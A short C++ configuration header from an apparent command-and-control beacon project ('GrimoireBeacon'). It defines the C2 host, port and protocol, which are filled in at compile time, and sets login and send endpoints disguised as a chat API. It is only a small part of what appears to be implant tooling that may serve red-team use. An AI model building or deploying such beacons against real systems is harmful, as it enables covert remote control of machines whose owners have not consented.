//
// Created by Nebu1ea on 2025/11/27.
//

#ifndef GRIMOIREBEACON_GRIMOIRECONFIG_HPP
#define GRIMOIREBEACON_GRIMOIRECONFIG_HPP
#include <string>

namespace Grimoire::Config {

    // 在编译时，HOST和PORT 会被替换成 server 脚本传入的字符串字面量
    const std::string Grimoire_C2_PORT = GRIMOIRE_C2_PORT;
    const std::string Grimoire_C2_HOST = GRIMOIRE_C2_HOST;
    const std::string Grimoire_C2_PROTOCOL = GRIMOIRE_C2_PROTOCOL;
    const std::string Grimoire_C2_LOGIN = "/api/chat/login";
    const std::string Grimoire_C2_SEND = "/api/chat/send";
}


#endif //GRIMOIREBEACON_GRIMOIRECONFIG_HPP